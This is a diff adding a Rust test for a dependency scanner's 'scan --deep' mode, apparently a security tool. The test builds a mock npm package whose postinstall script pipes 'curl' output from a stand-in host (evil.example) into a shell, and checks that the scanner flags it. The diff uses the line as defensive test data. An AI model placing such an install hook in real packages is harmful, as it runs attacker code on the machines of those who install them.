@@ -659,6 +659,94 @@ const EPSS_RESPONSE_JSON: &str = r#"{
   ]
 }"#;
 
+// ── `scan --deep` behavioral tests ───────────────────────────────────────────
+
+/// A minimal npm tarball (gzip-compressed tar) containing `package.json` with a
+/// malicious `postinstall` script, plus a trivial `index.js`.
+fn malicious_tarball() -> Vec<u8> {
+    use flate2::write::GzEncoder;
+    use flate2::Compression;
+    use std::io::Write;
+
+    let package_json = br#"{
+  "name": "evil-pkg",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl -s http://evil.example/x.sh | sh"
+  }
+}"#;
+    let index_js = b"module.exports = 1;\n";
+
+    let mut builder = tar::Builder::new(Vec::new());
+    for (name, data) in [
+        ("package/package.json", &package_json[..]),
+        ("package/index.js", &index_js[..]),
+    ] {
+        let mut header = tar::Header::new_gnu();
+        header.set_size(data.len() as u64);
+        header.set_mode(0o644);
+        header.set_cksum();
+        builder.append_data(&mut header, name, data).unwrap();
+    }
+    let tar_bytes = builder.into_inner().unwrap();
+
+    let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
+    encoder.write_all(&tar_bytes).unwrap();
+    encoder.finish().unwrap()
+}
+
+#[test]
+fn scan_deep_reports_malicious_postinstall_from_mock_registry() {
+    let mut server = mockito::Server::new();
+    // npm packument for the dependency.
+    server
+        .mock("GET", "/evil-pkg")
+        .with_status(200)
+        .with_header("content-type", "application/json")
+        .with_body(
+            r#"{
+              "name": "evil-pkg",
+              "dist-tags": { "latest": "1.0.0" },
+              "versions": {
+                "1.0.0": {
+                  "name": "evil-pkg",
+                  "version": "1.0.0",
+                  "dist": {
+                    "tarball": "TARBALL_URL"
+                  }
+                }
+              }
+            }"#
+            .replace("TARBALL_URL", &format!("{}/evil-pkg/-/evil-pkg-1.0.0.tgz", server.url())),
+        )
+        .create();
+    // The tarball itself.
+    server
+        .mock("GET", "/evil-pkg/-/evil-pkg-1.0.0.tgz")
+        .with_status(200)
+        .with_header("content-type", "application/octet-stream")
+        .with_body(malicious_tarball())
+        .create();
+
+    let output = depradar()
+        .env("DEPRADAR_NPM_REGISTRY_URL", server.url())
+        .args(["--format", "json", "scan", "--deep"])
+        .arg(fixture("npm-deep"))
+        .output()
+        .unwrap();
+
+    let json = stdout_json(&output);
+    let rendered = json.to_string();
+    assert!(
+        rendered.contains("evil-pkg"),
+        "dependency missing from output: {json}"
+    );
+    assert!(
+        rendered.contains("install") || rendered.contains("postinstall"),
+        "install-script finding missing from output: {json}"
+    );
+}
+
 #[test]
 fn scan_json_includes_epss_score_from_mock_server() {
     let mut server = mockito::Server::new();
